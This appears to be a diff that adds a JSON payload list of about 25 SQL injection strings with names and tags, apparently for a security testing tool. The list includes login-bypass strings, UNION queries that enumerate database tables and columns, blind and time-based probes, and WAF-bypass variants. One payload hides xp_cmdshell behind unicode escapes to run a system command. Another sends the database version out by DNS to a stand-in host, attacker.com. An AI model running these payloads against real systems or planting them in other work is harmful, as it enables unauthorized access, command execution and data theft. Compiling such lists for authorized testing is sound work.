@@ -1,0 +1,263 @@
+[
+  {
+    "name": "Basic OR True",
+    "category": "SQLi",
+    "description": "Classic OR 1=1 injection",
+    "payload": "' OR 1=1--",
+    "tags": [
+      "basic",
+      "auth-bypass"
+    ]
+  },
+  {
+    "name": "Basic OR True (double dash)",
+    "category": "SQLi",
+    "description": "OR 1=1 with double dash comment",
+    "payload": "' OR '1'='1",
+    "tags": [
+      "basic",
+      "auth-bypass"
+    ]
+  },
+  {
+    "name": "Admin Login Bypass",
+    "category": "SQLi",
+    "description": "Classic admin login bypass",
+    "payload": "admin'--",
+    "tags": [
+      "auth-bypass",
+      "login"
+    ]
+  },
+  {
+    "name": "UNION SELECT 1 column",
+    "category": "SQLi",
+    "description": "UNION based 1 column detection",
+    "payload": "' UNION SELECT NULL--",
+    "tags": [
+      "union",
+      "enumeration"
+    ]
+  },
+  {
+    "name": "UNION SELECT 2 columns",
+    "category": "SQLi",
+    "description": "UNION based 2 column detection",
+    "payload": "' UNION SELECT NULL,NULL--",
+    "tags": [
+      "union",
+      "enumeration"
+    ]
+  },
+  {
+    "name": "UNION SELECT 3 columns",
+    "category": "SQLi",
+    "description": "UNION based 3 column detection",
+    "payload": "' UNION SELECT NULL,NULL,NULL--",
+    "tags": [
+      "union",
+      "enumeration"
+    ]
+  },
+  {
+    "name": "Error Based - MSSQL",
+    "category": "SQLi",
+    "description": "Error based extraction MSSQL",
+    "payload": "' AND 1=CONVERT(int,@@version)--",
+    "tags": [
+      "error-based",
+      "mssql"
+    ]
+  },
+  {
+    "name": "Error Based - MySQL",
+    "category": "SQLi",
+    "description": "Error based extraction MySQL",
+    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
+    "tags": [
+      "error-based",
+      "mysql"
+    ]
+  },
+  {
+    "name": "Boolean Blind True",
+    "category": "SQLi",
+    "description": "Boolean blind true condition",
+    "payload": "' AND 1=1--",
+    "tags": [
+      "blind",
+      "boolean"
+    ]
+  },
+  {
+    "name": "Boolean Blind False",
+    "category": "SQLi",
+    "description": "Boolean blind false condition",
+    "payload": "' AND 1=2--",
+    "tags": [
+      "blind",
+      "boolean"
+    ]
+  },
+  {
+    "name": "Time Based Blind MySQL",
+    "category": "SQLi",
+    "description": "Time based blind injection MySQL",
+    "payload": "' AND SLEEP(5)--",
+    "tags": [
+      "time-based",
+      "mysql",
+      "blind"
+    ]
+  },
+  {
+    "name": "Time Based Blind MSSQL",
+    "category": "SQLi",
+    "description": "Time based blind injection MSSQL",
+    "payload": "'; WAITFOR DELAY '0:0:5'--",
+    "tags": [
+      "time-based",
+      "mssql",
+      "blind"
+    ]
+  },
+  {
+    "name": "Time Based Blind PostgreSQL",
+    "category": "SQLi",
+    "description": "Time based blind injection PostgreSQL",
+    "payload": "'; SELECT pg_sleep(5)--",
+    "tags": [
+      "time-based",
+      "postgresql",
+      "blind"
+    ]
+  },
+  {
+    "name": "Stacked Query MSSQL",
+    "category": "SQLi",
+    "description": "Stacked query for MSSQL",
+    "payload": "'; EXEC \\u0078\\u0070\\u005f\\u0063\\u006d\\u0064\\u0073\\u0068\\u0065\\u006c\\u006c('whoami')--",
+    "tags": [
+      "stacked",
+      "mssql",
+      "rce"
+    ]
+  },
+  {
+    "name": "MySQL Version",
+    "category": "SQLi",
+    "description": "Extract MySQL version",
+    "payload": "' UNION SELECT @@version,NULL,NULL--",
+    "tags": [
+      "union",
+      "mysql",
+      "info-gather"
+    ]
+  },
+  {
+    "name": "MySQL Current DB",
+    "category": "SQLi",
+    "description": "Get current database name",
+    "payload": "' UNION SELECT database(),NULL,NULL--",
+    "tags": [
+      "union",
+      "mysql",
+      "info-gather"
+    ]
+  },
+  {
+    "name": "MySQL Tables",
+    "category": "SQLi",
+    "description": "List tables from information_schema",
+    "payload": "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
+    "tags": [
+      "union",
+      "mysql",
+      "enumeration"
+    ]
+  },
+  {
+    "name": "MySQL Columns",
+    "category": "SQLi",
+    "description": "List columns from information_schema",
+    "payload": "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
+    "tags": [
+      "union",
+      "mysql",
+      "enumeration"
+    ]
+  },
+  {
+    "name": "PostgreSQL Version",
+    "category": "SQLi",
+    "description": "Extract PostgreSQL version",
+    "payload": "' UNION SELECT version(),NULL,NULL--",
+    "tags": [
+      "union",
+      "postgresql",
+      "info-gather"
+    ]
+  },
+  {
+    "name": "SQLite Version",
+    "category": "SQLi",
+    "description": "Extract SQLite version",
+    "payload": "' UNION SELECT sqlite_version(),NULL,NULL--",
+    "tags": [
+      "union",
+      "sqlite",
+      "info-gather"
+    ]
+  },
+  {
+    "name": "Out of Band DNS MySQL",
+    "category": "SQLi",
+    "description": "OOB DNS exfil via MySQL LOAD_FILE",
+    "payload": "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\share\\\\'))--",
+    "tags": [
+      "oob",
+      "dns",
+      "mysql"
+    ]
+  },
+  {
+    "name": "Integer Injection",
+    "category": "SQLi",
+    "description": "Integer based injection no quotes",
+    "payload": "1 OR 1=1",
+    "tags": [
+      "integer",
+      "basic"
+    ]
+  },
+  {
+    "name": "Comment Variations",
+    "category": "SQLi",
+    "description": "Various SQL comment syntax",
+    "payload": "' OR 1=1/*",
+    "tags": [
+      "comment",
+      "bypass"
+    ]
+  },
+  {
+    "name": "Second Order Injection",
+    "category": "SQLi",
+    "description": "Payload stored then executed later",
+    "payload": "admin'--",
+    "tags": [
+      "second-order",
+      "stored"
+    ]
+  },
+  {
+    "name": "WAF Bypass Space",
+    "category": "SQLi",
+    "description": "Bypass WAF using comment as space",
+    "payload": "'/**/OR/**/1=1--",
+    "tags": [
+      "waf-bypass",
+      "comment"
+    ]
+  }
+]
